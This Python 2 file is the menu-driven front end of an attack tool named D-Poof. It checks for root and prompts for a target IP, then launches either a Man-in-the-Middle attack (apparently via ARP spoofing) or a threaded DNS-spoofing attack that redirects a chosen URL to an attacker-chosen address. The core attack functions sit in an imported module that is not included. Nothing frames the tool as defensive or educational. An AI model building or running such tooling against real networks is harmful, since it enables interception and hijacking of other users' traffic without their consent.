import dpoof, os, subprocess, sys, threading

class Interface():

	def __init__(self):
		self.device, self.my_ip, self.gateway = dpoof.get_info()
		self.threads = []

	def show_init(self):

		if os.geteuid() != 0:
			os.system('clear')
			print '\nRoot privileges are needed to run D-Poof.\nPlease, try again.\n'
			self.exit()

		file = open('draw.ascii', 'r')
		lines = file.readlines()

		os.system('clear')

		for line in lines:
			print line.strip()

		self.show_menu()

	def show_menu(self):
		print '\r\n MAIN MENU'
		print '\r\n\t1) Man In The Middle'
		print '\t2) DNS Spoofing'
		print '\r\nType exit to leave\r\n'

	def exit(self):
		dpoof.kill_arpspoof()
		print("\nGOOD BYE!\n")
		sys.exit(0)

	def mitm(self):
		ip = raw_input('Target ip: ')
		print '\nPerforming Man in the Middle attack... ',
		dpoof.man_in_the_middle(self.device, ip, self.gateway)
		print 'OK\r\n'

	def dns_spoof(self):
		focus = raw_input('Target URL (Empty = All): ')
		ip = raw_input('Target ip: ')
		redirect = raw_input('Redirect to (Empty = Localhost): ')
		print 'Performing DNS-Spoofing attack... ',
		t = threading.Thread(target=dpoof.dns_spoofing, args=(focus, redirect, self.device, ip, self.my_ip,))
		self.threads.append(t)
		t.setDaemon(True)
		t.start()
		print 'OK\r\n'




######################################
# MAIN ROUTINE
######################################

interface = Interface()
interface.show_init()

while True:
	cmd = raw_input('> ')
	
	if cmd == '1':
		interface.mitm()
	elif cmd == '2':
		interface.dns_spoof()
	elif cmd == 'exit' or cmd == 'EXIT':
		interface.exit()
	else:
		interface.show_menu()